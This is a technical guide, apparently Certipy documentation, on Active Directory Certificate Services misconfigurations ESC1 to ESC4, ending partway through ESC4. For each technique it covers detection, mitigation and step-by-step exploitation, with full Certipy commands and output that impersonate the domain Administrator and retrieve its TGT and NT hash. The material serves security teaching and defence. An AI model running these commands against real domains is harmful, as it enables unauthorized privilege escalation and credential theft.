Misconfigurations in AD CS can allow a low-privileged user to escalate privileges in Active Directory, often up to Domain Admin. The SpecterOps research introduced the "ESC" numbering to classify these **AD CS abuse scenarios**. Here we cover **ESC1 through ESC17** (as of 2026, 17 distinct escalation techniques have been identified). Each subsection explains the issue, technical details, how Certipy can detect or exploit it, examples of exploitation, and ways to mitigate that specific issue. Some attacks require multiple conditions or a chain of steps; Certipy's `find` output often flags the individual pieces, which an attacker can then exploit in sequence.

---

## **ESC1: Enrollee-Supplied Subject for Client Authentication**

1. **Description**

    ESC1 is the stereotypical AD CS misconfiguration that can lead directly to privilege escalation. The vulnerability arises when a certificate template is inadequately secured, permitting a low-privileged user to request a certificate and, importantly, specify an arbitrary identity within the certificate's SAN. This allows the attacker to impersonate any user, including administrators.

    The combination of these specific weak settings on a single certificate template creates the ESC1 vulnerability:

    * **Enrollee Supplies Subject:** The template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled. In the Certificate Template console, this is the "Supply in the request" option under the "Subject Name" tab. When enabled, the requester - not Active Directory - provides the subject information for the certificate. This is the core setting that allows an attacker to inject a victim's identity (e.g., UPN or DNS name) into the SAN.
    * **Authentication EKU:** The template includes an EKU that permits authentication. Common EKUs that enable this are "Client Authentication" (OID `1.3.6.1.5.5.7.3.2`), "Smart Card Logon" (OID `1.3.6.1.4.1.311.20.2.2`), "PKINIT Client Authentication" (OID `1.3.6.1.5.2.3.4`), or the overly permissive "Any Purpose" (OID `2.5.29.37.0`). A certificate with such an EKU can be used for network logons.
    * **Permissive Enrollment Rights:** Low-privileged users or broad groups like "Domain Users" or "Authenticated Users" are granted "Enroll" permissions on the template's security settings. This defines who can request certificates from this template.
    * **No Effective Security Gates:** The template does not enforce manager approval (the "CA certificate manager approval" option in "Issuance Requirements") nor requires authorized signatures (also known as enrollment agent signatures). The absence of these controls means qualifying requests are automatically processed and certificates issued without additional review.

    When these conditions are all met, any user with enrollment rights can submit a CSR for this template. In the CSR, they can specify an arbitrary UPN in the SAN (e.g., `administrator@corp.local`) and/or a SID in the `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`) or via a specific SAN URL format if the SID extension is not used. The CA, trusting the template's insecure configuration, issues a certificate that appears to belong to the specified privileged account. The attacker can then use this certificate to authenticate via Kerberos PKINIT or Schannel, effectively gaining the privileges of the impersonated user.

    This misconfiguration often occurs when administrators duplicate built-in templates (like "User" or "Machine") and modify them to allow "Supply in request", perhaps for compatibility with an application or device that requires specific subject names, without fully understanding the security ramifications. Another common scenario is duplicating a template like "WebServer" or "SubCA", which already has "Supply in request" enabled by default, and then adding a client authentication EKU to it. It's important to note that in an enterprise CA environment, new templates are typically created by duplicating an existing one, not from scratch. Due to its relative simplicity to exploit and its high impact, ESC1 is a frequently discovered and exploited AD CS vulnerability.

2. **Identification with Certipy**

    Certipy's `find` command is used to enumerate certificate templates and identify those vulnerable to ESC1. It specifically checks for templates where the "Enrollee Supplies Subject" option is enabled, an EKU suitable for authentication is present, manager approval and authorized signatures are not required, and it lists the principals (users/groups) that have enrollment rights. The `[+] User Enrollable Principals` field in the output for a template will indicate if the current user context running Certipy has enrollment rights, and through which group membership these rights are granted.

    **Expected Output Snippet:**

    Within the "Certificate Templates" section of the `certipy find` output, vulnerable templates are clearly marked, with "ESC1" listed under the `[!] Vulnerabilities` heading.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
      0
        Template Name                       : VulnTemplate
        Display Name                        : VulnTemplate
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        Client Authentication               : True
        ...
        Enrollee Supplies Subject           : True
        Certificate Name Flag               : EnrolleeSuppliesSubject
        ...
        Extended Key Usage                  : Client Authentication
                                              Secure Email
                                              Encrypting File System
        Requires Manager Approval           : False
        ...
        Authorized Signatures Required      : 0
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [!] Vulnerabilities
          ESC1                              : Enrollee supplies subject and template allows client authentication.
    ```

    **Key indicators to look for in the output for a specific template:**

    * `[!] Vulnerabilities ESC1 : Enrollee supplies subject and template allows client authentication.` This explicitly flags the vulnerability.
    * `Enrollee Supplies Subject : True` This confirms the setting allowing attacker-defined subjects.
    * `Client Authentication : True` (or other authentication EKUs listed in `Extended Key Usage`) This confirms the certificate can be used for logon.
    * `[+] User Enrollable Principals` showing a group like `CORP.LOCAL\Domain Users` or any group the attacker is a member of. This confirms the attacker has the necessary rights to request a certificate from this template.
    * `Requires Manager Approval : False` and `Authorized Signatures Required : 0` confirm the absence of preventative issuance controls.

3. **Exploitation with Certipy**

    Exploiting an ESC1 vulnerability typically involves two main steps:

    1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target.
    2. Using the obtained certificate to authenticate as the target.

    * **Step 1: Request the certificate for the target user.**
        The attacker (`attacker@corp.local`) uses `certipy req` to request a certificate. They specify the vulnerable template (`VulnTemplate`) and provide the UPN and SID of the desired target account (e.g., `administrator@corp.local`).

        > 💡 **Tip**: To find the SID and other attributes of a target user like 'administrator', you can use the command:
        > `certipy account -u 'USERNAME' -p 'PASSWORD' -dc-ip 'DC_IP' -user 'administrator' read`

        The command to request the certificate:

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'VulnTemplate' \
            -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
        ```

        * `-u 'attacker@corp.local' -p 'Passw0rd!'`: Credentials of the user performing the request.
        * `-dc-ip '10.0.0.100'`: IP address of a Domain Controller for DNS lookups if needed.
        * `-target 'CA.CORP.LOCAL' -ca 'CORP-CA'`: Specifies the target CA name and its DNS/hostname.
        * `-template 'VulnTemplate'`: The ESC1 vulnerable template.
        * `-upn 'administrator@corp.local'`: The UPN of the target user to be embedded in the certificate's SAN.
        * `-sid 'S-1-5-21-...-500'`: The SID of the target user (Administrator) to be embedded in the certificate's SID extension.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'administrator@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        The output confirms that a certificate was issued. `Got certificate with UPN 'administrator@corp.local'` and `Certificate object SID is 'S-1-5-21-...-500'` show that the CA included the attacker-supplied identity information in the certificate. The certificate and its corresponding private key are saved to `administrator.pfx`.

    * **Step 2: Authenticate using the obtained certificate.**
        The attacker now uses the generated `administrator.pfx` file with `certipy auth` to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        * `-pfx 'administrator.pfx'`: The PFX file containing the impersonation certificate and private key.
        * `-dc-ip '10.0.0.100'`: The IP address of a Domain Controller to authenticate against.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*]     SAN URL SID: 'S-1-5-21-...-500'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        Successful authentication results in a Kerberos TGT for the `administrator` account (saved to `administrator.ccache`), and Certipy will also attempt to retrieve the NTLM hash of the account. The attacker now possesses the means to act as `administrator` within the domain.

    *Note on targeting machine accounts:* If the goal is to impersonate a machine account (e.g., a Domain Controller like `DC01$`), the `-dns` parameter should be used with the FQDN of the machine (e.g., `-dns 'dc01.corp.local'`) instead of `-upn`. This correctly populates the dNSName field in the SAN, which is typically used for machine identity. The `-sid` parameter remains the same, specifying the machine account's SID. While using `-upn` with a machine account's UPN (e.g., `DC01$@corp.local`) might sometimes work, `-dns` is the more appropriate SAN type for machine identities.

4. **Mitigations**

    To prevent ESC1 vulnerabilities, implement the following security measures on your certificate templates:

    * **Disable "Enrollee supplies subject":** For templates intended for user or computer authentication, ensure the subject name source is configured as "Build from this Active Directory information". This setting forces AD to populate the subject details based on the requester's account, preventing attacker-supplied values. Do not use "Supply in the request" unless there is an explicit, well-understood business or technical need, and strong compensating controls (like manager approval) are in place.
    * **Restrict Enrollment Rights:** On the template's Security tab, grant "Enroll" permissions only to the specific users or security groups that legitimately require certificates from that template. Avoid granting these rights to broad, default groups like "Domain Users" or "Authenticated Users" for templates that could be abused.
    * **Implement Manager Approval:** For any template that *must* allow enrollee-supplied subjects, enable the "CA certificate manager approval" option found in the template's "Issuance Requirements" tab. This ensures that each certificate request is held in a pending state until an authorized CA manager reviews and approves it.
    * **Use Authorized Signatures:** If a template is high-impact (e.g., allows enrollee-supplied subjects or issues powerful EKUs), consider requiring one or more authorized signatures for enrollment. This means the CSR must be co-signed by one or more users holding specific "enrollment agent" certificates.
    * **Disable Unused Templates:** If a template is identified as vulnerable (or simply not needed for any legitimate business purpose), disable it by removing it from the list of templates issued by the CA, or by unpublishing it from Active Directory. This removes the attack vector.

---

## **ESC2: Any Purpose Certificate Template**

1. **Description**

    ESC2 vulnerabilities arise from certificate templates configured with an "Any Purpose" EKU or, equivalently, templates with no EKU specified at all. The "Any Purpose" EKU is identified by the OID `2.5.29.37.0`. A certificate issued from such a template can technically be used for any purpose allowed by its key and constraints, including client authentication, server authentication, code signing, and, most importantly for this escalation, as a Certificate Request Agent (also known as an Enrollment Agent).

    The vulnerability materializes when these conditions are met:

    * **Template with "Any Purpose" or No EKU:** The template either explicitly contains the "Any Purpose" EKU or has no EKUs defined (which implies any purpose).
    * **Permissive Enrollment Rights:** Low-privileged users (e.g., members of "Domain Users" or "Authenticated Users") are granted enrollment permissions for this template.

    While a certificate from such a template issued to an attacker would normally only allow them to authenticate as themselves, the "Any Purpose" nature implicitly grants the "Certificate Request Agent" capability (OID `1.3.6.1.4.1.311.20.2.1`). This allows the attacker to use their "Any Purpose" certificate to request *another* certificate on behalf of a *different* user, potentially a Domain Administrator. This is the primary privilege escalation path for ESC2, effectively turning the "Any Purpose" certificate into an Enrollment Agent certificate, thereby leveraging an attack path similar to ESC3.

    Exploitation of ESC2 typically involves two key components:

    1. **Obtaining an Any Purpose Certificate:** The attacker first enrolls for and obtains a certificate from the misconfigured template that grants "Any Purpose" (or has no EKU).
    2. **A Target Certificate Template Allowing Agent Enrollment:** A second certificate template (the "target template") must exist with the following characteristics:
        * It issues certificates suitable for client authentication (e.g., it contains the "Client Authentication" EKU).
        * It is configured to allow an Enrollment Agent to request certificates on behalf of other users. Many default templates, particularly Schema Version 1 templates like the built-in "User" or "Machine" template, inherently permit this without specific enrollment agent restrictions in their issuance policy.
        * The intended victim (e.g., a Domain Administrator) must have enrollment rights on this target template.

    Once an attacker possesses an "Any Purpose" certificate (acting as an agent certificate) and identifies a suitable target template, they can submit a certificate request "on behalf of" their victim. The CA, recognizing the request as coming from a valid Enrollment Agent (due to the "Any Purpose" nature of the attacker's certificate), will issue a certificate for the victim to the attacker.

    It's important to note the distinction for Schema Version 2 (or newer) target templates: these templates, if configured to require authorized signatures for enrollment agent requests, must explicitly list the "Any Purpose" EKU (or the specific "Certificate Request Agent" EKU) in their "Application Policy" issuance requirements for the agent's certificate to be accepted. However, many environments retain Schema Version 1 templates (like "User" or "Machine") which do not have this granular check, making them common targets for ESC2/ESC3 exploitation.

    Administrators might create "Any Purpose" templates inadvertently for reasons like simplifying certificate deployment for diverse applications or by duplicating templates without fully understanding the broad capabilities granted by an unrestricted or empty EKU field.

2. **Identification with Certipy**

    Certipy's `find` command can identify templates configured with "Any Purpose" EKU or no EKU. It will also help identify templates that can be targeted by such "Any Purpose" certificates acting as enrollment agents.

    * Templates that grant the "Any Purpose" capability will be flagged by Certipy with: `ESC2 : Template can be used for any purpose.` Since "Any Purpose" includes the "Certificate Request Agent" EKU, these templates will often also be flagged as `ESC3`.
    * Templates that can be enrolled *by* an agent (including one derived from an ESC2 "Any Purpose" certificate) on behalf of another user are often indicated in the "Remarks" section by Certipy, for example: `ESC2 Target Template : Template can be targeted as part of ESC2 exploitation.` or `ESC3 Target Template`.

    The `[+] User Enrollable Principals` field will indicate if the current user context has rights to enroll in the "Any Purpose" template.

    **Expected Output Snippet:**

    Look for `Any Purpose : True` or an empty `Extended Key Usage` list for the issuing template, and the ESC2/ESC3 vulnerability flags. For target templates, check the remarks.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
      0
        Template Name                       : AnyPurposeCert
        Display Name                        : AnyPurposeCert
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        ...
        Enrollment Agent                    : True
        Any Purpose                         : True
        ...
        Extended Key Usage                  : Any Purpose
        Requires Manager Approval           : False
        ...
        Authorized Signatures Required      : 0
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [!] Vulnerabilities
          ESC2                              : Template can be used for any purpose.
          ESC3                              : Template has Certificate Request Agent EKU set.
    ...
      20
        Template Name                       : User
        Display Name                        : User
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        Client Authentication               : True
        ...
        Schema Version                      : 1
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [*] Remarks
          ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
          ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
    ```

    **Key indicators:**

    * For the misconfigured "Any Purpose" template (`AnyPurposeCert`):
        * `[!] Vulnerabilities ESC2 : Template can be used for any purpose.`
        * `[!] Vulnerabilities ESC3 : Template has Certificate Request Agent EKU set.` (This is because "Any Purpose" implicitly includes Enrollment Agent).
        * `Any Purpose : True` (or the `Extended Key Usage` field might be empty or missing).
        * `Enrollment Agent : True` (always true if `Any Purpose` is true).
        * `[+] User Enrollable Principals` showing enrollment rights for the attacker or a group they belong to.
    * For the target template (`User` in this example):
        * `[*] Remarks ESC2 Target Template` and `ESC3 Target Template`, often because `Schema Version : 1` templates generally allow agent-based enrollment without specific issuance policy restrictions for the agent.

3. **Exploitation with Certipy**

    The exploitation of ESC2 for privilege escalation typically follows these steps:

    1. The attacker enrolls for a certificate using the "Any Purpose" template (e.g., `AnyPurposeCert`). This certificate can now act as an Enrollment Agent certificate.
    2. The attacker uses this newly acquired "Any Purpose" certificate to request a *new* certificate on behalf of a privileged user (e.g., Administrator). This second request targets a standard template like "User" or "Machine" that allows enrollment by enrollment agents and for which the target user has enrollment rights.
    3. The attacker uses the "on-behalf-of" certificate to authenticate as the privileged user.

    * **Step 1: Request the "Any Purpose" certificate for the attacker.**
        The attacker (`attacker@corp.local`) requests a certificate from the `AnyPurposeCert` template.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'AnyPurposeCert'
        ```

        This command requests a certificate for the `attacker` user from the specified template. The resulting `.pfx` file (`attacker.pfx` in this case) contains the certificate that has the "Any Purpose" EKU.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'attacker@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-1106'
        [*] Saving certificate and private key to 'attacker.pfx'
        [*] Wrote certificate and private key to 'attacker.pfx'
        ```

        This provides `attacker.pfx`, a certificate which, due to its "Any Purpose" EKU, can act as an enrollment agent certificate.

    * **Step 2: Request a certificate on behalf of the target user using the "Any Purpose" certificate.**
        The attacker uses their `attacker.pfx` (obtained in Step 1) to request a certificate for `CORP\Administrator` using a standard, agent-enrollable template like `User`.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'User' \
            -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
        ```

        * `-template 'User'`: The target template that allows agent enrollment and issues authentication certificates.
        * `-pfx 'attacker.pfx'`: Specifies the attacker's own certificate, which will be used as the enrollment agent certificate.
        * `-on-behalf-of 'CORP\Administrator'`: Specifies the target user for whom the new certificate is being requested. This must be in the `<DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME>` format.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 2
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'Administrator@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        This creates `administrator.pfx`, a certificate valid for the `Administrator` account, issued to the attacker.

    * **Step 3: Authenticate using the "on-behalf-of" certificate.**
        The attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'Administrator@CORP.LOCAL'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        The attacker successfully obtains a Kerberos TGT and the NTLM hash for the Administrator account.

4. **Mitigations**

    * **Avoid "Any Purpose" EKU:** Do not use the "Any Purpose" EKU (OID `2.5.29.37.0`) in certificate templates. If a certificate needs to serve multiple roles, list each required EKU explicitly. This is the most direct mitigation.
    * **Specify EKUs Explicitly:** Avoid leaving the EKU list blank in a template, as this also implies "Any Purpose". Define the narrowest set of EKUs necessary for the template's function.
    * **Restrict Enrollment Rights:** For any template, grant enrollment permissions only to specific users or groups that legitimately require such certificates. Avoid broad groups like "Domain Users" for templates with powerful EKUs like "Any Purpose" or "Certificate Request Agent".
    * **Implement Manager Approval:** For templates with potentially broad implications or powerful EKUs, enable "CA certificate manager approval" in the template's "Issuance Requirements" tab. This adds a manual review step.
    * **Use Authorized Signatures for Agent Enrollment:** For Schema Version 2+ templates that are intended to be enrolled by agents, configure the "Issuance Requirements" tab to require specific enrollment agent EKU in the agent's certificate ("Application policy" section) and specify the number of authorized signatures. This prevents an "Any Purpose" certificate from qualifying unless "Any Purpose" is explicitly allowed as an application policy for the agent.
    * **Phase out V1 Target Templates:** Consider replacing Schema Version 1 templates (like the default "User" or "Machine" templates) that are targets for agent enrollment. Duplicate them as Schema Version 2 (or newer) templates and apply stricter issuance requirements for enrollment agents if this functionality is needed.
    * **Disable Unused Templates:** If a template providing "Any Purpose" capabilities is found and not actively needed, disable it.

---

## **ESC3: Enrollment Agent Certificate Template**

1. **Description**

    ESC3 vulnerabilities exploit weaknesses related to Certificate Request Agents, also known as Enrollment Agents. An Enrollment Agent is an account authorized to request certificates *on behalf of* other users. This functionality is legitimate in scenarios such as helpdesk staff enrolling smart cards for users or for automated certificate provisioning systems. However, if an attacker gains access to an active Enrollment Agent certificate, or if they can enroll for a new Enrollment Agent certificate due to misconfigured template permissions, they can abuse this privilege to obtain certificates for other users, including highly privileged accounts like Domain Administrators.

    The exploitation of ESC3 typically involves two key components:

    1. **Obtaining an Enrollment Agent Certificate:** The attacker must first acquire a certificate that includes the "Certificate Request Agent" EKU (Object Identifier `1.3.6.1.4.1.311.20.2.1`). This can occur if:

        * A certificate template specifically designed to issue Enrollment Agent certificates (e.g., the built-in "EnrollmentAgent" template, "CEPEncryption" template, or a custom equivalent) has overly permissive enrollment rights, allowing the attacker (or a group they belong to, like "Domain Users") to enroll.
        * A template vulnerable to ESC2 ("Any Purpose" EKU or no EKU) is enrollable by the attacker, as "Any Purpose" implicitly includes the "Certificate Request Agent" capability.

    2. **A Target Certificate Template Allowing Agent Enrollment:** There must be another certificate template (the "target template") that:

        * Issues certificates suitable for authentication (e.g., it includes the "Client Authentication" EKU or "Smart Card Logon" EKU).
        * Is configured to allow an Enrollment Agent to request certificates on behalf of other users. Many default templates, particularly Schema Version 1 templates like the built-in "User" or "Machine" templates, inherently permit this without requiring specific enrollment agent restrictions in their issuance policy.
        * The intended victim (e.g., a Domain Administrator) must have enrollment rights on this target template.

    Once an attacker possesses an Enrollment Agent certificate and identifies a suitable target template, they can submit a certificate request to the CA "on behalf of" the victim. The CA, recognizing the request as originating from a valid Enrollment Agent (by verifying the agent's certificate), will issue a certificate for the victim user, but deliver it to the attacker. The attacker can then use this certificate to authenticate as the victim.

    For Schema Version 2 (or newer) target templates, administrators have more granular control. They can specify in the template's "Issuance Requirements" that only agents with certificates containing certain "Application Policies" (EKUs) are allowed to enroll on behalf of others. If these are configured, the enrollment agent's certificate must contain one of the specified application policy OIDs. However, Schema Version 1 templates lack this fine-grained control and are generally susceptible if an attacker has any valid enrollment agent certificate.

2. **Identification with Certipy**

    Certipy's `find` command helps identify both templates that can issue Enrollment Agent certificates and templates that can be targeted by Enrollment Agents.

    * Templates that issue enrollment agent certificates (i.e., contain the "Certificate Request Agent" EKU) will be flagged by Certipy with: `ESC3 : Template has Certificate Request Agent EKU set.`
    * Templates that can be enrolled *by* an agent on behalf of another user are often indicated in the "Remarks" section of the Certipy output for that template, for example: `ESC3 Target Template : Template can be targeted as part of ESC3 exploitation.`

    The `[+] User Enrollable Principals` field for the agent-issuing template will indicate if the current user has rights to enroll for an Enrollment Agent certificate.

    **Expected Output Snippet:**

    Pay attention to templates showing `Enrollment Agent : True` and the `ESC3` vulnerability. Also, check the remarks for potential target templates.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
    ...
    Certificate Templates
      0
        Template Name                       : EnrollAgent
        Display Name                        : EnrollAgent
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        ...
        Enrollment Agent                    : True
        ...
        Extended Key Usage                  : Certificate Request Agent
        Requires Manager Approval           : False
        ...
        Authorized Signatures Required      : 0
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [!] Vulnerabilities
          ESC3                              : Template has Certificate Request Agent EKU set.
    ...
      20
        Template Name                       : User
        Display Name                        : User
        Certificate Authorities             : CORP-CA
        Enabled                             : True
        Client Authentication               : True
        ...
        Schema Version                      : 1
        ...
        Permissions
          Enrollment Permissions
            Enrollment Rights               : CORP.LOCAL\Domain Users
        ...
        [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
        [*] Remarks
          ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
          ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
    ```

    **Key indicators:**

    * For the agent-issuing template (e.g., `EnrollAgent`):
        * `[!] Vulnerabilities ESC3 : Template has Certificate Request Agent EKU set.`
        * `Enrollment Agent : True`
        * `Extended Key Usage` contains `Certificate Request Agent`.
        * `[+] User Enrollable Principals` lists a group the attacker belongs to (e.g., `CORP.LOCAL\Domain Users`), granting them rights to obtain an agent certificate.
    * For the target template (e.g., `User`):
        * `[*] Remarks ESC3 Target Template : ... Template has schema version 1.` Schema Version 1 templates are common targets because they typically allow agent-based enrollment without additional restrictions on the agent's certificate.
        * `Client Authentication : True` (or similar authentication EKU).
        * `[+] User Enrollable Principals` for the target template should ideally show that the *target victim* (e.g., Administrator or Domain Admins group) has enrollment rights.

3. **Exploitation with Certipy**

    The exploitation process involves obtaining an Enrollment Agent certificate and then using it to request a certificate for a privileged user, which is then used for authentication.

    * **Step 1: Obtain an Enrollment Agent certificate.**
        The attacker (`attacker@corp.local`) enrolls for a certificate from the misconfigured `EnrollAgent` template (or an ESC2 "Any Purpose" template).

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'EnrollAgent'
        ```

        This command requests a certificate for `attacker@corp.local` using the `EnrollAgent` template. The output `.pfx` file (`attacker.pfx` in this case) will contain the Enrollment Agent certificate.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'attacker@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-1106'
        [*] Saving certificate and private key to 'attacker.pfx'
        [*] Wrote certificate and private key to 'attacker.pfx'
        ```

        This command saves the Enrollment Agent certificate and its private key into `attacker.pfx`.

    * **Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user.**
        The attacker uses their `attacker.pfx` (their agent certificate obtained in Step 1) to request a certificate from the `User` template (or another suitable agent-enrollable target template) on behalf of `CORP\Administrator`.

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'User' \
            -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
        ```

        * `-template 'User'`: The target template that allows agent enrollment and issues authentication certificates.
        * `-pfx 'attacker.pfx'`: Specifies the attacker's own certificate, which will be used as the enrollment agent certificate to sign the "on-behalf-of" request.
        * `-on-behalf-of 'CORP\Administrator'`: Specifies the target user for whom the new certificate is being requested. This parameter requires the `<DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME>` format for the user.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 2
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'Administrator@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-500'
        [*] Saving certificate and private key to 'administrator.pfx'
        [*] Wrote certificate and private key to 'administrator.pfx'
        ```

        This creates `administrator.pfx`, a certificate valid for the `Administrator` account, but now possessed by the attacker.

    * **Step 3: Authenticate using the "on-behalf-of" certificate.**
        The attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'Administrator@CORP.LOCAL'
        [*]     Security Extension SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        The attacker successfully obtains a Kerberos TGT and the NTLM hash for the `Administrator` account.

4. **Mitigations**

    * **Restrict Enrollment Rights on Agent-Issuing Templates:** For templates that grant "Certificate Request Agent" EKU, strictly limit enrollment permissions to only authorized personnel (e.g., a dedicated Helpdesk group for enrollment agents). Avoid granting these rights to broad groups like "Domain Users".
    * **Phase out V1 Target Templates:** Consider replacing Schema Version 1 templates (like the default "User" or "Machine" templates) that are targets for agent enrollment. Duplicate them as Schema Version 2 (or newer) templates and apply stricter issuance requirements for enrollment agents if this functionality is needed.
    * **Implement Manager Approval:** For templates that issue Enrollment Agent certificates, or for target templates if enrollment agent restrictions are loose, consider enabling "CA certificate manager approval" to add a manual review step.
    * **Disable Unused Templates:** If templates are not used for any legitimate purpose, disable them.

---

## **ESC4: Template Hijacking**

1. **Description**

    ESC4, or Template Hijacking, occurs when an attacker gains permissions to modify a certificate template object stored in Active Directory. Certificate templates are AD objects residing in the Configuration Naming Context (under `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`) and are protected by ACLs. If an attacker obtains `Write` access - such as `WriteDACL` (to change permissions), `WriteOwner` (to take ownership and then change permissions), specific `WriteProperty` rights on critical attributes, or `FullControl` - over a template object, they can alter its configuration. This modification can turn a previously secure template into one vulnerable to other attack scenarios, most commonly ESC1 (Enrollee-Supplied Subject for Client Authentication) or ESC2 (Any Purpose Certificate).

    For example, an attacker with such permissions could maliciously modify a template to:

    * Grant enrollment rights on the template to themselves or a broad group like "Domain Users".
    * Enable the "Enrollee Supplies Subject" setting (set the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag).
